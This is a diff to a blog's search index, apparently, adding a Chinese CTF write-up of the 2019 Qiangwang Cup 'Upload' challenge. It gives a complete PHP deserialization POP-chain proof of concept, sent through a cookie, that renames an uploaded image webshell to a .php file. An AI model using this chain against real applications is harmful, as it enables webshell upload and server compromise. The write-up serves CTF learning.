@@ -6388,8 +6388,43 @@ https://www.anquanke.com/post/id/219107#h2-14
 ]]></content>
   </entry>
   <entry>
-    <title>buuctf22</title>
-    <url>/2021/07/13/buuctf22/</url>
+    <title>2019强网杯upload</title>
+    <url>/2021/07/13/2019%E5%BC%BA%E7%BD%91%E6%9D%AFupload/</url>
+    <content><![CDATA[<h2 id="强网杯-2019-Upload"><a href="#强网杯-2019-Upload" class="headerlink" title="[强网杯 2019]Upload"></a>[强网杯 2019]Upload</h2><p><a href="http://www.tar.gz有他的源码，注册以后发现可以文件上传，审计一下他的文件上传功能：">www.tar.gz有他的源码，注册以后发现可以文件上传，审计一下他的文件上传功能：</a><br>将上传的文件的后缀更改为png</p>
+<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210716082418.png" alt="img" style="zoom:67%;">
+
+<p>然后使用getimagesize检查文件头是否为图片</p>
+<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210716082534.png" alt="img" style="zoom:67%;">
+
+<p>文件上传这里似乎没有太多机会，可能需要哪里辅助一下<br>这里有个反序列化函数，可以对profile进行赋值</p>
+<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210716084205.png" alt="img" style="zoom:67%;">
+底下有两个魔术方法:
+get：读取不可访问或不存在的属性时调用
+call：调用不可访问或不存在的方法时调用
+<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210716085443.png" alt="img" style="zoom:67%;">
+
+<p>看了一下其他地方发现有个destruct方法<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210716102445.png" alt="img" style="zoom:67%;"></p>
+<h3 id="思路整理"><a href="#思路整理" class="headerlink" title="思路整理"></a>思路整理</h3><p>1.文件上传的限制在于后缀名会被强制更改为png<br>2.可以对cookie的值进行反序列化，会触发get、call魔术方法调用不存在的属性和方法对profile进行重新赋值操作<br>3.如何将profile和更换文件后缀联系在一起呢？<br>——————————————————————<br>我们可以看到在upload_img()函数中有一个copy函数，将filename_tmp的值赋给了filename。那么思路就是这样：<br>1.先上传一个图片马<br>2.然后通过cookie传入反序列化内容，其中反序列化的思路应该是这样的:<br>为了使用call和get方法，所以我们要调用没有的属性和方法，profile.php中没有register中的方法，所以这里就可以先写一波:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$registed&#x3D;new Register();</span><br><span class="line">$registed-&gt;registed&#x3D;false;</span><br><span class="line">$registed-&gt;checker&#x3D;$profiled;</span><br></pre></td></tr></table></figure>
+
+<p>接下来就会调用profile里面的get和call方法:<br>首先会调用call方法因为index方法不存在再profile类里面，因为我们的目的是利用call方法调用upload_img()，所以我们需要利用get方法对name赋值，由于get是调用不存在的属性，所以我们这里依旧是利用index来作为一个跳板置换成upload_img(),然后有几个判断是我们需要绕过的，其中包括检查ext是否为png</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$profiled&#x3D;new Profile();</span><br><span class="line">$profiled-&gt;except&#x3D;[&#39;index&#39;&#x3D;&gt;&#39;upload_img&#39;];</span><br><span class="line">$profiled-&gt;ext&#x3D;&quot;png&quot;;</span><br><span class="line">$profiled-&gt;filename&#x3D;&quot;&#x2F;upload&#x2F;7792cab172a46cd0ff2d8d7fae734ba2&#x2F;8111.php&quot;;</span><br><span class="line">$profiled-&gt;filename_tmp&#x3D;&quot;&#x2F;upload&#x2F;7792cab172a46cd0ff2d8d7fae734ba2&#x2F;8383c2ba7b9a26c39fbe4c61bf398ed4.php&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>完整的poc如下</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $upload_menu;</span><br><span class="line">    <span class="keyword">public</span> $ext;</span><br><span class="line">    <span class="keyword">public</span> $img;</span><br><span class="line">    <span class="keyword">public</span> $except;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name, $arguments</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;&#123;$name&#125;) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $checker;</span><br><span class="line">        <span class="keyword">public</span> $registed;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">$profiled=<span class="keyword">new</span> Profile();</span><br><span class="line">$profiled-&gt;except=[<span class="string">&#x27;index&#x27;</span>=&gt;<span class="string">&#x27;upload_img&#x27;</span>];</span><br><span class="line">$profiled-&gt;ext=<span class="string">&quot;png&quot;</span>;</span><br><span class="line">$profiled-&gt;filename=<span class="string">&quot;/upload/7792cab172a46cd0ff2d8d7fae734ba2/8111.php&quot;</span>;</span><br><span class="line">$profiled-&gt;filename_tmp=<span class="string">&quot;/upload/7792cab172a46cd0ff2d8d7fae734ba2/8383c2ba7b9a26c39fbe4c61bf398ed4.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">$registed=<span class="keyword">new</span> Register();</span><br><span class="line">$registed-&gt;registed= <span class="literal">false</span>;</span><br><span class="line">$registed-&gt;checker=$profiled;</span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(serialize($registed)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这是我在本地构建的，将所有用到的类整合到一个文件里面，方便进行调试查看赋值过程，否则还需要在开头再加上:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
+
+<p>将序列化后的内容使用cookie传入即可，前提是先上传一个文件马</p>
+<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210717103343.png" alt="img" style="zoom:67%;">
+<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210717103345.png" alt="img" style="zoom:67%;">
+
+]]></content>
+  </entry>
+  <entry>
+    <title>buu22</title>
+    <url>/2021/07/17/buu22/</url>
     <content><![CDATA[]]></content>
   </entry>
 </search>
